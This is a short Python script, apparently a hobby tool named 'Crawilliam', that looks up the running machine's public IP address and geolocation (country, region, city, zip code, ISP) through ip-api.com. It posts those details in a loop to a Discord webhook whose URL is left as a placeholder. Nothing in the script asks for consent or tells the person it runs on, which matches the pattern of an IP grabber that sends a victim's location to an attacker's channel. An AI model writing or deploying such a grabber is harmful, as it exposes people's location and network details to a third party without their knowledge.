from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import json
from time import sleep

#IP Address and Geolocation API
Addy = requests.get('http://ip-api.com/json/').text
Pinfo = json.loads(Addy)


#Function used to upload IP and Geolocation from API using Discord Webhook
def WebhookLoop():
    webhook = DiscordWebhook(
    url='INSERTYOURWEBHOOK',
    username='Crawilliam'
     )

    embed = DiscordEmbed(
    title="Crawilliam's Fetch",
    description='Crawilliam returns with...',
    color='A168F3'
    )
#Probably a more efficient way of doing this, can't think of one though, too tired
    embed.set_author(name='Crawilliam', url='https://github.com/NotXeroShi', icon_url='https://i.redd.it/5ifqxapw1rz41.jpg')
    embed.add_embed_field(name='Status:', value=Pinfo['status'], inline=False)
    embed.add_embed_field(name='IP Address:', value=Pinfo['query'], inline=False)
    embed.add_embed_field(name='Country:', value=Pinfo['country'])
    embed.add_embed_field(name='Reigon:', value=Pinfo['regionName'])
    embed.add_embed_field(name='City', value=Pinfo['city'])
    embed.add_embed_field(name='Zip Code:', value=Pinfo['zip'])
    embed.add_embed_field(name='ISP:', value=Pinfo['isp'], inline=False)
    embed.set_timestamp()
    embed.set_footer(text='Made with Sleepless Delusions.')
    webhook.add_embed(embed)
    response = webhook.execute()
    sleep(15) #temp time, just using this to see how well it works.
    response = webhook.edit(response) #edits last message sent

#Loop to put this mess together
while True:
    WebhookLoop()
